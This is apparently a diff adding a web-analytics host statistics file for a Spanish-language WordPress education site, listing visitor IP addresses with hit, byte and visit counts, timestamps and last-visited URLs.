+/wp-admin/admin-ajax.php
+208.80.194.30
+0 2 0 41046 1 1428277569 0 0
+-
+213.143.50.71
+0 1 1 78883 0 0 0 0
+-
+190.137.229.237
+0 1 1 78883 0 0 0 0
+-
+190.127.234.33
+0 1 0 20571 0 0 0 0
+-
+201.236.242.247
+0 1 0 20571 0 0 0 0
+-
+180.76.6.135
+0 1 0 324 1 1428263992 0 0
+/portfolio/responsabilidades-parentales/
+189.217.17.194
+0 1 0 20570 0 0 0 0
+-
+180.76.5.77
+0 3 2 9430 2 1428077592 0 0
+/portfolio/tecnicas-de-ventas-efectivas/
+197.231.221.211
+0 12 12 2569364 0 0 0 0
+-
+177.238.3.93
+0 1 0 20571 0 0 0 0
+-
+100.34.171.112
+0 89 89 4093154 1 1428141995 0 0
+/wp-admin/admin-ajax.php
+201.143.51.77
+0 2 2 79111 0 0 0 0
+-
+186.106.1.219
+0 1 1 78883 0 0 0 0
+-
+190.186.217.168
+0 1 0 20570 0 0 0 0
+-
+188.132.190.12
+0 1 1 8159 1 1428009511 0 0
+/
+200.81.151.236
+0 1 0 20571 0 0 0 0
+-
+134.249.53.85
+0 8 6 124486 1 1427869351 0 0
+/
+71.191.56.224
+0 1 1 171494 0 0 0 0
+-
+212.79.196.47
+0 1 0 381 1 1427972005 0 0
+-
+189.211.173.63
+0 1 1 78883 0 0 0 0
+-
+180.76.6.151
+0 2 1 8436 2 1428051244 0 0
+/
+190.29.22.151
+0 1 0 20515 0 0 0 0
+-
+201.209.208.43
+0 1 1 78883 0 0 0 0
+-
+180.76.6.29
+0 2 0 20915 1 1428208973 0 0
+/portfolio/salud-espiritual-jesus-la-gran-esperanza/
+187.188.86.11
+0 80 80 1041486 1 1428002974 0 0
+/portfolio/teologia/
+201.192.55.202
+0 1 1 78883 0 0 0 0
+-
+54.159.217.51
+0 1 1 8157 1 1428288986 0 0
+/
+192.0.86.127
+0 1 0 20521 0 0 0 0
+-
+81.45.53.245
+0 1 1 78883 0 0 0 0
+-
+186.42.219.243
+0 112 112 2153211 1 1427861459 0 0
+/wp-admin/admin-ajax.php
+189.230.111.171
+0 2 0 41142 0 0 0 0
+-
+189.236.182.100
+0 1 0 20571 0 0 0 0
+-
+190.56.253.179
+0 1 0 20571 0 0 0 0
+-
+173.252.112.115
+0 1 1 78883 0 0 0 0
+-
+67.63.160.132
+0 1 1 8157 1 1428120731 0 0
+/
+186.181.208.1
+0 1 1 67160 0 0 0 0
+-
+190.233.28.177
+0 2 2 157766 0 0 0 0
+-
+173.252.101.117
+0 2 2 157766 0 0 0 0
+-
+66.102.7.163
+0 17 9 707208 0 0 0 0
+-
+123.125.71.116
+0 2 2 68790 2 1428219431 0 0
+/
+107.221.201.11
+0 2 0 41154 0 0 0 0
+-
+104.154.18.175
+0 54 54 1759265 1 1428080800 0 0
+/
+201.210.221.191
+0 1 1 50016 0 0 0 0
+-
+181.177.16.247
+0 78 72 596032 1 1427896051 0 0
+/wp-admin/admin-ajax.php
+199.30.25.127
+0 1 1 5418 1 1428034447 0 0
+/wp-admin/admin-ajax.php
+189.175.53.190
+0 137 136 5686616 1 1428241365 0 0
+/wp-admin/admin-ajax.php
+190.234.105.204
+0 1 0 20571 0 0 0 0
+-
+190.86.137.112
+0 1 0 20571 0 0 0 0
+-
+166.78.169.147
+0 2 1 1804 1 1428083540 0 0
+/wp-admin/admin-ajax.php
+77.199.203.36
+0 85 85 1053063 1 1428234008 0 0
+/wp-admin/admin-ajax.php
+68.0.212.182
+0 1 0 20571 0 0 0 0
+-
+87.220.164.229
+0 87 86 1055172 1 1428067450 0 0
+/wp-admin/admin-ajax.php
+186.104.94.189
+0 1 1 78883 0 0 0 0
+-
+199.30.24.217
+0 1 1 1477 0 0 0 0
+-
+189.198.180.237
+0 1 1 40080 0 0 0 0
+-
+189.153.8.189
+0 87 87 1060442 1 1428194517 0 0
+/wp-admin/admin-ajax.php
+189.175.49.41
+0 20 18 1190378 1 1428239700 0 0
+/proiectum/educacion/
+190.66.246.109
+0 117 117 2221390 1 1427998152 0 0
+/wp-admin/admin-ajax.php
+69.171.237.112
+0 2 2 157766 0 0 0 0
+-
+201.172.10.40
+0 232 230 6355818 1 1428051149 0 0
+/admision/
+189.169.42.196
+0 1 0 20571 0 0 0 0
+-
+152.200.5.164
+0 1 1 78883 0 0 0 0
+-
+182.118.22.209
+0 1 1 8157 1 1428236761 0 0
+/
+200.76.83.115
+0 9 9 58120 0 0 0 0
+-
+181.155.54.34
+0 1 0 20571 0 0 0 0
+-
+177.237.219.192
+0 95 94 4114384 1 1427981889 0 0
+/wp-admin/admin-ajax.php
+189.132.23.138
+0 99 99 4249273 1 1428014911 0 0
+/wp-admin/admin-ajax.php
+189.190.94.235
+0 114 114 4823535 2 1428259924 0 0
+/wp-admin/admin-ajax.php
+141.0.8.95
+0 1 1 14138 1 1428132245 0 0
+/feed/
+172.56.30.176
+0 1 1 78883 0 0 0 0
+-
+189.172.149.52
+0 1 0 20571 0 0 0 0
+-
+192.0.86.101
+0 1 1 245 1 1428259847 0 0
+/
+201.160.181.92
+0 116 116 4499232 1 1427893579 0 0
+/wp-admin/admin-ajax.php
+180.76.6.59
+0 1 1 7672 1 1427943831 0 0
+/bloopers-2014/
+23.95.43.104
+0 1 1 8122 1 1428065838 0 0
+/
+189.193.145.219
+0 127 125 4764644 2 1428228803 0 0
+/wp-admin/admin-ajax.php
+190.177.240.241
+0 86 86 621461 1 1428056115 0 0
+/wp-admin/admin-ajax.php
+181.188.66.227
+0 7 0 123849 0 0 0 0
+-
+52.5.114.51
+0 7 0 1862 1 1428283876 0 0
+/
+180.76.5.153
+0 1 0 440 0 0 0 0
+-
+180.76.6.148
+0 1 1 7395 1 1428041709 0 0
+/portfolio/estrategias-de-ensenanza-para-las-nuevas-generaciones/
+187.172.166.12
+0 93 93 3596826 1 1428070893 0 0
+/wp-admin/admin-ajax.php
+190.121.140.2
+0 222 219 6937823 2 1428004228 0 0
+/wp-admin/admin-ajax.php
+187.200.152.156
+0 103 103 1233834 1 1428261582 0 0
+/portfolio/teologia/
+65.55.143.24
+0 13 13 67081 0 0 0 0
+-
+181.74.230.29
+0 1 1 78883 0 0 0 0
+-
+187.198.21.230
+0 1 0 20571 0 0 0 0
+-
+180.76.4.94
+0 1 0 285 1 1428094394 0 0
+/
+66.102.6.169
+0 54 53 593545 0 0 0 0
+-
+187.138.100.212
+0 1 1 78883 0 0 0 0
+-
+190.250.180.168
+0 1 1 78883 0 0 0 0
+-
+123.125.71.82
+0 2 2 42517 2 1428219389 0 0
+/
+104.154.123.190
+0 24 24 186363 1 1428047256 0 0
+/
+104.129.198.50
+0 205 202 2955392 2 1427976580 0 0
+/wp-admin/admin-ajax.php
+189.165.222.228
+0 1 1 78883 0 0 0 0
+-
+24.73.86.234
+0 359 354 7453036 1 1428063093 0 0
+/wp-admin/admin-ajax.php
+123.125.71.16
+0 1 1 8122 1 1427877413 0 0
+/
+95.20.127.31
+0 2 0 41142 0 0 0 0
+-
+190.99.149.206
+0 1 1 68633 0 0 0 0
+-
+189.154.110.251
+0 64 64 1748952 1 1428171572 0 0
+/wp-admin/admin-ajax.php
+173.208.177.59
+0 185 174 745650 4 1427926967 0 0
+/wp-login.php
+190.240.65.238
+0 1 1 78883 0 0 0 0
+-
+200.76.91.101
+0 10 10 109265 0 0 0 0
+-
+200.72.159.27
+0 1 1 78883 0 0 0 0
+-
+24.54.192.129
+0 159 159 6280365 1 1428085654 0 0
+/wp-admin/admin-ajax.php
+173.252.114.114
+0 2 2 396617 0 0 0 0
+-
+181.66.34.152
+0 1 0 20570 0 0 0 0
+-
+220.181.108.148
+0 1 1 34395 1 1427905061 0 0
+/
+220.181.108.100
+0 1 1 34395 1 1427957498 0 0
+/
+187.245.91.192
+0 86 86 1051906 1 1428178324 0 0
+/wp-admin/admin-ajax.php
+190.13.1.195
+0 1 0 20571 0 0 0 0
+-
+88.251.211.255
+0 1 1 78883 0 0 0 0
+-
+37.228.107.104
+0 1 0 20568 0 0 0 0
+-
+190.238.235.240
+0 1 1 171494 0 0 0 0
+-
+173.252.114.115
+0 2 2 96915 0 0 0 0
+-
+179.7.96.237
+0 1 1 78883 0 0 0 0
+-
+200.76.91.154
+0 8 8 678455 0 0 0 0
+-
+180.76.6.131
+0 2 1 1362 2 1428172517 0 0
+/
+189.158.38.250
+0 93 93 4094979 1 1428167342 0 0
+/wp-admin/admin-ajax.php
+200.106.22.32
+0 1 0 20571 0 0 0 0
+-
+181.66.156.9
+0 1 1 78883 0 0 0 0
+-
+177.245.144.204
+0 84 84 931268 1 1428186256 0 0
+/wp-admin/admin-ajax.php
+187.217.195.102
+0 87 87 4078387 1 1428261784 0 0
+/
+201.220.243.127
+0 1 1 78883 0 0 0 0
+-
+66.102.7.170
+0 22 10 434788 1 1427883509 0 0
+/
+180.76.4.64
+0 1 0 404 1 1428279102 0 0
+/
+189.199.36.162
+0 1 1 78883 0 0 0 0
+-
+68.228.163.224
+0 18 0 3074 0 0 0 0
+-
+186.144.43.228
+0 1 0 20571 0 0 0 0
+-
+189.151.33.184
+0 97 97 4115996 1 1427880880 0 0
+/wp-admin/admin-ajax.php
+179.53.75.56
+0 88 88 1061741 1 1428059540 0 0
+/wp-admin/admin-ajax.php
+65.55.183.30
+0 12 12 49654 0 0 0 0
+-
+64.237.228.46
+0 1 1 78883 0 0 0 0
+-
+189.133.171.131
+0 117 116 4781455 1 1428006085 0 0
+/wp-admin/admin-ajax.php
+179.7.100.97
+0 1 1 78883 0 0 0 0
+-
+37.228.104.144
+0 1 0 20568 0 0 0 0
+-
+220.181.108.184
+0 1 1 34395 1 1428082673 0 0
+/
+190.199.79.244
+0 1 1 78883 0 0 0 0
+-
+188.87.60.134
+0 1 1 78883 0 0 0 0
+-
+148.240.178.111
+0 1 0 20574 0 0 0 0
+-
+181.65.8.172
+0 1 1 78883 0 0 0 0
+-
+208.78.85.244
+0 2 2 16319 2 1427946296 0 0
+/
+123.125.71.80
+0 1 1 34395 1 1428226685 0 0
+/
+119.63.196.126
+0 1 0 404 0 0 0 0
+-
+190.238.135.69
+0 1 1 78883 0 0 0 0
+-
+191.112.240.19
+0 1 1 78883 0 0 0 0
+-
+186.92.217.180
+0 84 84 806056 1 1427960802 0 0
+/wp-admin/admin-ajax.php
+185.17.184.228
+0 1 1 2821 0 0 0 0
+-
+173.252.110.116
+0 1 1 78883 0 0 0 0
+-
+180.76.5.172
+0 2 0 706 2 1428075791 0 0
+/
+189.158.44.137
+0 91 91 4089614 1 1427873411 0 0
+/wp-admin/admin-ajax.php
+187.216.136.36
+0 173 173 6424099 1 1428007391 0 0
+/wp-admin/admin-ajax.php
+69.171.227.113
+0 1 1 8158 1 1427985467 0 0
+/
+180.76.5.143
+0 1 1 5736 1 1428050471 0 0
+/mi-cuenta/e42-lite/
+186.104.109.56
+0 1 1 78883 0 0 0 0
+-
+201.170.101.68
+0 1 0 20570 0 0 0 0
+-
+187.189.58.133
+0 1 1 68633 0 0 0 0
+-
+131.253.36.204
+0 9 9 104058 0 0 0 0
+-
+190.71.242.214
+0 1 0 20571 0 0 0 0
+-
+131.253.24.133
+0 2 2 7539 0 0 0 0
+-
+208.54.39.176
+0 1 1 171494 0 0 0 0
+-
+189.236.33.47
+0 87 87 1060460 1 1428176709 0 0
+/wp-admin/admin-ajax.php
+187.198.75.148
+0 101 100 1260472 1 1428273692 0 0
+/wp-admin/admin-ajax.php
+173.252.77.114
+0 2 2 5636 0 0 0 0
+-
+189.198.101.124
+0 4 4 315530 0 0 0 0
+-
+100.43.90.12
+0 12 7 127638 7 1428237920 0 0
+/articulos/
+190.237.68.83
+0 1 1 78883 0 0 0 0
+-
+187.195.166.171
+0 85 85 962364 1 1427897090 0 0
+/wp-admin/admin-ajax.php
+209.17.114.78
+0 1 0 20550 0 0 0 0
+-
+157.56.19.90
+0 6 6 24827 0 0 0 0
+-
+189.215.217.157
+0 1 1 68633 0 0 0 0
+-
+189.243.29.189
+0 1 0 20573 0 0 0 0
+-
+186.117.158.2
+0 1 0 20520 0 0 0 0
+-
+186.9.133.100
+0 1 1 78883 0 0 0 0
+-
+201.144.162.20
+0 1 1 8156 1 1428173908 0 0
+/
+144.76.185.173
+0 1 1 34432 1 1427909905 0 0
+/
+198.229.1.137
+0 212 156 2426483 2 1428227535 0 0
+/wp-admin/admin-ajax.php
+31.4.211.65
+0 7 0 1211 0 0 0 0
+-
+201.161.58.43
+0 1 0 20571 0 0 0 0
+-
+189.193.7.17
+0 1 0 20571 0 0 0 0
+-
+186.82.59.227
+0 2 0 41142 0 0 0 0
+-
+173.252.74.119
+0 1 1 78883 0 0 0 0
+-
+104.154.19.60
+0 59 59 3159080 1 1428037198 0 0
+/
+200.23.91.182
+0 3 0 61746 0 0 0 0
+-
+190.208.135.125
+0 1 1 78883 0 0 0 0
+-
+190.95.38.231
+0 1 1 78883 0 0 0 0
+-
+213.143.60.253
+0 1 1 77900 0 0 0 0
+-
+190.195.77.45
+0 1 0 20577 0 0 0 0
+-
+187.131.11.75
+0 135 134 4209503 2 1427972387 0 0
+/wp-admin/admin-ajax.php
+189.132.198.78
+0 15 11 77234 1 1427894742 0 0
+/wp-admin/admin-ajax.php
+181.174.64.63
+0 1 0 20571 0 0 0 0
+-
+173.215.41.2
+0 1 0 20571 0 0 0 0
+-
+201.240.44.66
+0 1 0 20571 0 0 0 0
+-
+131.253.36.202
+0 11 11 71517 0 0 0 0
+-
+181.67.110.233
+0 1 1 78883 0 0 0 0
+-
+200.41.237.69
+0 1 0 20495 0 0 0 0
+-
+189.168.181.254
+0 1 1 78883 0 0 0 0
+-
+179.7.94.218
+0 1 1 78883 0 0 0 0
+-
+192.99.149.173
+0 1 0 266 1 1427898390 0 0
+/
+23.112.100.13
+0 1 1 78883 0 0 0 0
+-
+189.219.213.39
+0 1 0 20571 0 0 0 0
+-
+189.178.179.154
+0 87 87 1060446 1 1427935438 0 0
+/wp-admin/admin-ajax.php
+181.67.3.138
+0 1 0 20571 0 0 0 0
+-
+189.203.217.236
+0 87 87 1060474 1 1427924445 0 0
+/wp-admin/admin-ajax.php
+190.134.148.9
+0 1 0 20571 0 0 0 0
+-
+188.40.60.225
+0 5 5 171880 5 1428240771 0 0
+/
+190.139.3.181
+0 1 0 20571 0 0 0 0
+-
+66.220.158.114
+0 1 1 78883 0 0 0 0
+-
+68.180.228.181
+0 32 10 226666 16 1428073969 0 0
+/portfolio/orientacion-familiar/
+190.99.32.195
+0 85 85 1053063 1 1427948942 0 0
+/wp-admin/admin-ajax.php
+131.253.26.233
+0 10 10 24848 0 0 0 0
+-
+142.129.61.183
+0 87 87 1060448 1 1428272879 0 0
+/wp-admin/admin-ajax.php
+187.168.252.133
+0 1 0 20571 0 0 0 0
+-
+66.220.158.117
+0 3 1 79783 0 0 0 0
+-
+177.246.164.226
+0 139 139 7718681 1 1427974671 0 0
+/portfolio/salud-emocional-y-bienestar-personal/
+189.191.231.227
+0 1 0 20571 0 0 0 0
+-
+186.26.115.222
+0 3 0 61713 0 0 0 0
+-
+201.141.37.221
+0 1 1 78883 0 0 0 0
+-
+189.203.237.106
+0 1 1 68633 0 0 0 0
+-
+190.42.16.145
+0 1 1 78883 0 0 0 0
+-
+189.135.152.189
+0 250 250 10263649 2 1427967726 0 0
+/wp-admin/admin-ajax.php
+173.252.88.88
+0 1 1 5979 0 0 0 0
+-
+173.252.100.119
+0 1 1 78883 0 0 0 0
+-
+65.55.210.102
+0 5 5 44837 0 0 0 0
+-
+104.238.96.58
+0 1 0 20489 1 1427971282 0 0
+-
+190.117.113.152
+0 3 3 157995 0 0 0 0
+-
+187.166.92.210
+0 1 0 20571 0 0 0 0
+-
+201.153.49.254
+0 1 1 78883 0 0 0 0
+-
+180.76.5.177
+0 1 1 6891 1 1427890909 0 0
+/acerca/
+201.131.151.1
+0 1 0 20571 0 0 0 0
+-
+50.154.157.247
+0 1 0 20571 0 0 0 0
+-
+159.16.107.58
+0 16 0 2746 0 0 0 0
+-
+190.42.87.104
+0 1 0 20571 0 0 0 0
+-
+201.114.228.97
+0 4 4 55343 1 1427892381 0 0
+/wp-admin/admin-ajax.php
+181.211.114.222
+0 2 0 41142 0 0 0 0
+-
+187.165.238.12
+0 2 2 157766 0 0 0 0
+-
+186.6.186.33
+0 3 0 61719 0 0 0 0
+-
+104.33.104.186
+0 113 111 1982705 1 1427996977 0 0
+/wp-admin/admin-ajax.php
+189.186.199.153
+0 118 118 4751132 1 1427865139 0 0
+/wp-admin/admin-ajax.php
+66.249.65.164
+0 2 0 882 0 0 0 0
+-
+173.252.77.117
+0 1 1 5969 0 0 0 0
+-
+189.172.168.216
+0 87 87 1060444 1 1428285793 0 0
+/wp-admin/admin-ajax.php
+187.139.132.71
+0 87 87 1060466 1 1428144516 0 0
+/wp-admin/admin-ajax.php
+216.113.160.77
+0 1 0 394 0 0 0 0
+-
+189.133.109.189
+0 18 17 1032702 1 1427892481 0 0
+/wp-admin/admin-ajax.php
+190.158.84.61
+0 2 2 40308 0 0 0 0
+-
+216.107.155.114
+0 2 1 33577 1 1428060566 0 0
+-
+173.209.211.153
+0 1 1 171438 0 0 0 0
+-
+66.220.158.119
+0 4 3 237099 0 0 0 0
+-
+187.175.28.164
+0 73 59 403045 1 1427892850 0 0
+/wp-admin/admin-ajax.php
+187.148.95.193
+0 1 0 20571 0 0 0 0
+-
+220.181.108.112
+0 1 1 8121 1 1427942870 0 0
+/
+187.184.89.3
+0 88 88 1061766 1 1427885516 0 0
+/wp-admin/admin-ajax.php
+179.7.107.121
+0 1 0 20571 0 0 0 0
+-
+200.25.232.149
+0 1 1 78827 0 0 0 0
+-
+189.132.198.183
+0 37 37 1584765 2 1427885059 0 0
+/wp-admin/admin-ajax.php
+181.51.154.243
+0 1 0 20571 0 0 0 0
+-
+181.66.156.36
+0 1 1 78883 0 0 0 0
+-
+208.94.232.182
+0 3 3 42246 3 1428136296 0 0
+/feed/
+190.90.220.244
+0 9 9 30935 0 0 0 0
+-
+189.242.85.219
+0 9 9 30936 0 0 0 0
+-
+188.165.234.68
+0 185 103 3120725 1 1428142830 0 0
+-
+66.249.67.4
+0 1 0 441 0 0 0 0
+-
+187.211.58.198
+0 147 147 5167706 2 1428272537 0 0
+/wp-admin/admin-ajax.php
+157.55.39.246
+0 4 2 55049 3 1428210715 0 0
+/
+98.255.90.24
+0 6 6 25049 0 0 0 0
+-
+189.252.117.111
+0 69 69 1737298 1 1428161468 0 0
+/wp-admin/admin-ajax.php
+180.76.6.159
+0 1 1 8120 1 1428015815 0 0
+/
+186.14.131.32
+0 1 0 20571 0 0 0 0
+-
+200.81.38.66
+0 1 0 20571 0 0 0 0
+-
+190.3.201.108
+0 1 1 78883 0 0 0 0
+-
+190.42.16.4
+0 1 1 78883 0 0 0 0
+-
+189.218.193.152
+0 1 0 20571 0 0 0 0
+-
+186.92.169.100
+0 1 1 78883 0 0 0 0
+-
+87.118.120.157
+0 1 0 454 1 1428012097 0 0
+/wp-admin/admin-ajax.php
+180.76.6.21
+0 2 1 27016 1 1428284545 0 0
+/author/leticia/
+213.143.48.14
+0 1 0 20571 0 0 0 0
+-
+189.176.10.82
+0 1 1 78883 0 0 0 0
+-
+189.236.168.92
+0 2 0 41142 0 0 0 0
+-
+220.181.108.89
+0 1 1 34395 1 1427882356 0 0
+/
+66.249.65.176
+0 37 0 16565 3 1428175053 0 0
+/portfolio/maestria-en-educacion/
+198.229.1.130
+0 153 153 3767181 1 1428207402 0 0
+/wp-admin/admin-ajax.php
+181.64.192.169
+0 1 0 20571 0 0 0 0
+-
+207.46.13.101
+0 36 21 262272 12 1428281963 0 0
+-
+200.83.21.36
+0 1 0 20571 0 0 0 0
+-
+189.41.165.193
+0 98 98 4888376 1 1428079115 0 0
+/wp-admin/admin-ajax.php
+189.176.46.243
+0 85 84 682061 1 1427896439 0 0
+/wp-admin/admin-ajax.php
+187.138.66.3
+0 91 91 4089612 1 1428088573 0 0
+/wp-admin/admin-ajax.php
+181.197.216.160
+0 2 2 71618 0 0 0 0
+-
+54.84.198.40
+0 1 1 13114 0 0 0 0
+-
+186.118.233.249
+0 87 87 1060460 1 1427958885 0 0
+/wp-admin/admin-ajax.php
+176.10.104.227
+0 3 3 103185 3 1428163570 0 0
+/
+84.78.25.103
+0 1 1 78883 0 0 0 0
+-
+201.247.35.53
+0 87 87 1060446 1 1428181092 0 0
+/wp-admin/admin-ajax.php
+187.237.107.32
+0 1 1 8537 0 0 0 0
+-
+186.37.202.208
+0 1 1 78883 0 0 0 0
+-
+187.138.210.191
+0 1 0 20571 0 0 0 0
+-
+190.218.4.194
+0 1 0 20578 0 0 0 0
+-
+5.9.151.67
+0 206 204 1511337 2 1428282267 0 0
+/tag/virtual/
+180.76.6.50
+0 2 1 8450 2 1427957776 0 0
+/
+190.214.90.98
+0 1 1 48157 0 0 0 0
+-
+87.221.131.147
+0 1 1 68633 0 0 0 0
+-
+2.136.206.252
+0 1 0 20570 0 0 0 0
+-
+208.78.85.247
+0 1 1 8159 1 1428043096 0 0
+/
+201.239.135.207
+0 1 1 78883 0 0 0 0
+-
+182.118.20.149
+0 4 4 15090 1 1428235784 0 0
+/
+65.55.227.219
+0 6 6 24827 0 0 0 0
+-
+186.28.16.102
+0 1 0 20571 0 0 0 0
+-
+65.55.210.95
+0 19 19 76429 1 1428212511 0 0
+/wp-admin/admin-ajax.php
+104.197.42.175
+0 1 1 34354 1 1428051918 0 0
+/
+189.174.91.36
+0 85 85 1057626 1 1428104515 0 0
+/portfolio/curso-de-induccion/
+181.157.151.31
+0 1 0 20571 0 0 0 0
+-
+199.30.24.46
+0 31 31 3687386 0 0 0 0
+-
+200.77.64.73
+0 1 0 20813 0 0 0 0
+-
+201.215.107.115
+0 1 1 78883 0 0 0 0
+-
+201.215.194.224
+0 1 1 78883 0 0 0 0
+-
+187.252.215.2
+0 87 87 1060444 1 1427989825 0 0
+/wp-admin/admin-ajax.php
+187.155.52.225
+0 1 0 20571 0 0 0 0
+-
+104.154.117.250
+0 48 48 332733 1 1428176429 0 0
+/
+189.193.252.218
+0 89 89 1063095 1 1428179891 0 0
+/wp-admin/admin-ajax.php
+94.228.34.250
+0 3 2 14412 1 1428154756 0 0
+/feed/
+187.153.17.208
+0 2 0 41142 0 0 0 0
+-
+189.249.71.43
+0 1 0 20571 0 0 0 0
+-
+123.125.71.77
+0 2 1 28645 1 1427993686 0 0
+/
+187.170.210.46
+0 107 107 4279867 1 1428277658 0 0
+/
+189.168.209.48
+0 1 0 20571 0 0 0 0
+-
+100.43.90.10
+0 4 3 39673 1 1427848461 0 0
+-
+190.213.227.32
+0 72 72 2776629 1 1427863470 0 0
+/diplomados/
+180.76.5.155
+0 1 0 324 1 1427964915 0 0
+/portfolio/formacion-en-tutoria-virtual/
+200.87.239.214
+0 87 87 1060238 1 1428074046 0 0
+/portfolio/curso-de-induccion/
+173.254.216.66
+0 2 1 8369 1 1427860775 0 0
+/
+66.249.73.245
+0 24 4 14133 13 1428279834 0 0
+-
+177.231.226.214
+0 1 0 20571 0 0 0 0
+-
+190.233.212.136
+0 1 0 20571 0 0 0 0
+-
+173.252.73.112
+0 1 1 78883 0 0 0 0
+-
+123.125.71.98
+0 1 1 8121 1 1427904869 0 0
+/
+189.131.195.56
+0 1 1 78883 0 0 0 0
+-
+187.150.144.118
+0 100 100 4250403 1 1428271284 0 0
+/wp-admin/admin-ajax.php
+131.253.24.138
+0 16 14 140313 1 1427950490 0 0
+-
+66.220.156.113
+0 1 0 20567 0 0 0 0
+-
+187.153.208.78
+0 146 146 5906892 2 1428076776 0 0
+/wp-admin/admin-ajax.php
+104.154.117.157
+0 24 24 190612 1 1427861208 0 0
+/
+186.26.116.20
+0 1 1 78883 0 0 0 0
+-
+187.161.6.129
+0 59 59 837062 1 1428257297 0 0
+/
+66.249.65.193
+0 1 1 8156 1 1428045221 0 0
+/
+205.201.132.14
+0 3 1 22499 1 1427882963 0 0
+/autofinanciamiento/
+180.76.5.175
+0 1 0 406 1 1428082748 0 0
+/
+220.181.108.177
+0 1 1 34395 1 1428219543 0 0
+/
+79.147.81.245
+0 1 0 20571 0 0 0 0
+-
+186.6.147.96
+0 1 1 78883 0 0 0 0
+-
+66.220.156.116
+0 1 1 78883 0 0 0 0
+-
+189.234.237.120
+0 102 102 4256104 1 1428072287 0 0
+/wp-admin/admin-ajax.php
+85.49.249.34
+0 1 0 20573 0 0 0 0
+-
+186.147.45.76
+0 1 0 20571 0 0 0 0
+-
+201.252.63.91
+0 1 0 20515 0 0 0 0
+-
+84.120.112.86
+0 1 0 20571 0 0 0 0
+-
+191.119.135.82
+0 1 1 78883 0 0 0 0
+-
+180.76.5.196
+0 1 1 7294 1 1428222282 0 0
+/portfolio/sexualidad/
+190.179.89.217
+0 1 1 29293 0 0 0 0
+-
+187.206.165.229
+0 89 89 2619635 1 1428236468 0 0
+/wp-admin/admin-ajax.php
+220.181.108.78
+0 1 1 34395 1 1428226805 0 0
+/
+109.235.51.155
+0 1 1 610 1 1427982864 0 0
+/xmlrpc.php
+180.76.5.176
+0 1 1 556 0 0 0 0
+-
+180.76.6.144
+0 1 1 8147 1 1428134531 0 0
+/portfolio/ventas/
+24.137.249.82
+0 1 0 20571 0 0 0 0
+-
+180.76.5.146
+0 1 0 406 1 1427864069 0 0
+-
+10.7.249.190
+0 108 108 4217808 1 1427905772 0 0
+/
+12.226.244.66
+0 7 7 42512 0 0 0 0
+-
+23.95.43.107
+0 1 1 8120 1 1428269617 0 0
+/
+201.161.233.152
+0 206 173 8073746 2 1428008706 0 0
+/wp-admin/admin-ajax.php
+187.147.139.127
+0 1 0 20571 0 0 0 0
+-
+207.46.11.222
+0 6 6 24827 0 0 0 0
+-
+157.55.104.78
+0 12 12 49654 0 0 0 0
+-
+66.220.158.113
+0 1 1 78883 0 0 0 0
+-
+192.198.93.98
+0 4 2 47454 1 1428262778 0 0
+-
+204.121.6.54
+0 1 1 245 1 1427993345 0 0
+/
+187.143.91.33
+0 1 1 78883 0 0 0 0
+-
+186.101.78.122
+0 115 115 3180606 1 1427996158 0 0
+/wp-admin/admin-ajax.php
+189.236.205.210
+0 123 101 3683103 1 1427884737 0 0
+/wp-admin/admin-ajax.php
+66.249.65.172
+0 46 0 20559 9 1428278435 0 0
+/
+180.76.4.79
+0 1 0 404 1 1428221496 0 0
+/
+10.7.249.65
+0 94 94 4093827 1 1428267449 0 0
+/wp-admin/admin-ajax.php
+162.220.162.86
+0 3 3 69150 3 1428008223 0 0
+/contacto/
+77.75.77.36
+0 36 6 630907 1 1428161262 0 0
+/
+173.252.112.116
+0 1 1 78883 0 0 0 0
+-
+189.175.23.133
+0 310 310 10628846 1 1428163283 0 0
+/portfolio/licenciatura-en-administracion-de-empresas/
+190.237.224.226
+0 2 2 157766 0 0 0 0
+-
+180.76.6.62
+0 1 0 383 1 1428133629 0 0
+-
+189.169.137.116
+0 2 2 157766 0 0 0 0
+-
+200.76.91.142
+0 4 4 42840 1 1428238477 0 0
+/wp-admin/admin-ajax.php
+194.187.168.27
+0 36 35 209434 6 1428221582 0 0
+/portfolio/ventas/
+189.146.29.244
+0 1 0 20571 0 0 0 0
+-
+190.232.104.7
+0 3 3 129628 0 0 0 0
+-
+187.233.56.59
+0 177 177 9838876 1 1427932945 0 0
+/wp-admin/admin-ajax.php
+201.186.119.247
+0 2 2 157766 0 0 0 0
+-
+65.55.157.152
+0 6 6 24827 0 0 0 0
+-
+37.228.105.226
+0 88 88 1018425 1 1428176051 0 0
+/feed/
+101.226.168.243
+0 1 1 8159 1 1427878504 0 0
+/
+186.34.251.112
+0 1 1 40080 0 0 0 0
+-
+220.181.108.90
+0 1 1 6890 1 1428106039 0 0
+/acerca/
+66.102.7.240
+0 1 1 60709 0 0 0 0
+-
+186.29.240.7
+0 1 1 78883 0 0 0 0
+-
+64.79.85.205
+0 86 85 646993 3 1428165380 0 0
+/portfolio/consejeria-familiar-dinamica-familiar/
+136.243.5.215
+0 2 2 38427 1 1428174625 0 0
+/acerca/
+32.208.117.5
+0 86 86 1147299 1 1427991441 0 0
+/wp-admin/admin-ajax.php
+190.233.59.5
+0 2 2 157766 0 0 0 0
+-
+31.173.240.134
+0 1 0 20575 0 0 0 0
+-
+187.148.9.61
+0 2 2 157766 0 0 0 0
+-
+190.35.182.132
+0 1 0 20571 0 0 0 0
+-
+104.197.173.106
+0 1 1 8159 1 1428253764 0 0
+/
+173.214.173.36
+0 2 2 57426 1 1428186323 0 0
+/contacto/
+187.210.78.16
+0 1 1 78883 0 0 0 0
+-
+173.252.88.89
+0 1 1 4198 0 0 0 0
+-
+65.55.65.30
+0 6 6 24827 0 0 0 0
+-
+181.64.84.90
+0 141 140 3985393 1 1428232254 0 0
+/wp-admin/admin-ajax.php
+201.141.73.130
+0 1 0 20571 0 0 0 0
+-
+180.250.250.42
+0 1 1 8101 1 1428120755 0 0
+/
+190.157.176.152
+0 139 95 1278756 6 1428244116 0 0
+/wp-admin/admin-ajax.php
+64.233.173.239
+0 5 5 10526 0 0 0 0
+-
+220.181.108.116
+0 1 1 34395 1 1427942943 0 0
+/
+190.149.96.44
+0 1 1 78883 0 0 0 0
+-
+180.76.6.213
+0 3 1 8831 3 1428279514 0 0
+/
+186.78.169.132
+0 1 1 16369 0 0 0 0
+-
+66.249.73.202
+0 18 0 7936 8 1428281833 0 0
+-
+220.181.108.105
+0 1 1 8121 1 1427882304 0 0
+/
+167.62.133.58
+0 1 1 48157 0 0 0 0
+-
+189.164.126.9
+0 95 95 4102363 1 1427977832 0 0
+/wp-admin/admin-ajax.php
+66.220.152.115
+0 6 6 213647 0 0 0 0
+-
+187.138.102.35
+0 150 148 6758285 2 1427887747 0 0
